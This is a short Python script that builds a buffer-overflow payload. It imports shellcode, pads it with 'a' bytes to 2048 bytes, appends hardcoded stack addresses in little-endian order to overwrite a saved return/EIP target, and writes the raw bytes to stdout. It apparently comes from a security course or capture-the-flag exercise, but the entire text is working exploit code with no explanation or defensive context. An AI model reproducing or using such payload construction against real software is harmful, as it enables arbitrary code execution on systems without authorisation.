from shellcode import shellcode
import sys
fill = 2048 - len(shellcode)
eip_addr = 0xfff6a05c
# shellcode_addr = 0xfffe9850       # address of where the argument is stored, NOT in buf
shellcode_addr = 0xfff69848         # address of buf start, which is what is needed
user_input = b"a" * fill
user_input += shellcode_addr.to_bytes(4, "little")
user_input += eip_addr.to_bytes(4, "little")
final = shellcode + user_input
sys.stdout.buffer.write(final)